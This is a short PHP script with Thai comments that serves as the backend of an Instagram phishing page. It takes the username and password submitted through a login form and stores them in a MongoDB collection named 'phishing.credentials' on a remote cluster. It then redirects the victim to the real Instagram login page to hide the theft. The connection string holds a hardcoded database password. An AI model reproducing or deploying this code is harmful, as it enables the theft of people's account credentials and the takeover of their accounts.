<?php
require 'vendor/autoload.php'; // โหลด composer autoload

use MongoDB\Client;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username && $password) {
        try {
            // เชื่อมต่อ MongoDB (แก้ connection string เป็นของคุณ)
            $client = new Client("mongodb+srv://ig-login:C1gd6Iec6MX2LXUD@ig-login.fqd6tee.mongodb.net/");

            $collection = $client->phishing->credentials;

            // บันทึกข้อมูลลง MongoDB
            $insertResult = $collection->insertOne([
                'username' => $username,
                'password' => $password
            ]);

            echo "บันทึกข้อมูลสำเร็จ! ID: " . $insertResult->getInsertedId();

            header("Location: https://www.instagram.com/accounts/login/");
            exit();

        } catch (Exception $e) {
            echo "เกิดข้อผิดพลาด: " . $e->getMessage();
        }
    } else {
        echo "กรุณากรอก username และ password ให้ครบถ้วน";
    }
} else {
    echo "วิธีการส่งข้อมูลไม่ถูกต้อง";
}
